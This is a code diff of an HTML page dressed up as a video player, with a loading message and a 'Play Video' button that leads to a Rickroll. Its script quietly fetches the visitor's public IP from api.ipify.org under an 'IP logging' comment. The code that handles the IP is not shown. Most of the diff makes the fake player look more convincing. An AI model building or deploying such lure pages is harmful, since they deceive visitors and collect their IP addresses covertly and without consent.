@@ -7,15 +7,57 @@
     body {
       background: #000;
       color: #0f0;
-      font-family: monospace;
-      padding: 2rem;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .player {
+      background: #111;
+      width: 640px;
+      height: 360px;
+      border: 2px solid #0f0;
+      border-radius: 8px;
+      padding: 20px;
+      text-align: center;
+    }
+
+    .video-title {
+      font-size: 24px;
+      margin-bottom: 10px;
+    }
+
+    .loading {
+      color: #aaa;
+      font-size: 18px;
+    }
+
+    .play-btn {
+      background-color: #0f0;
+      color: black;
+      padding: 12px 25px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 18px;
+      display: inline-block;
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
-  <h1>loading video...</h1>
+  <div class="player">
+    <div class="video-title">Loading Video...</div>
+    <div class="loading">Please wait while the video is loading...</div>
+    <button class="play-btn" id="playBtn">Play Video</button>
+  </div>
 
   <script>
+    // IP logging
     fetch("https://api.ipify.org?format=json")
       .then(res => res.json())
       .then(data => {
@@ -30,10 +72,16 @@
         });
       });
 
-    // OPTIONAL: redirect after 3 seconds
+    // Display the "Play Video" button after 3 seconds, simulate delay
     setTimeout(() => {
-      window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // lol
-    }, 7000);
+      document.querySelector(".loading").textContent = "Video is ready to play!";
+      document.getElementById("playBtn").style.display = "inline-block";
+    }, 3000);
+
+    // Add redirect after they click the play button
+    document.getElementById("playBtn").addEventListener("click", () => {
+      window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // classic Rickroll
+    });
   </script>
 </body>
 </html>
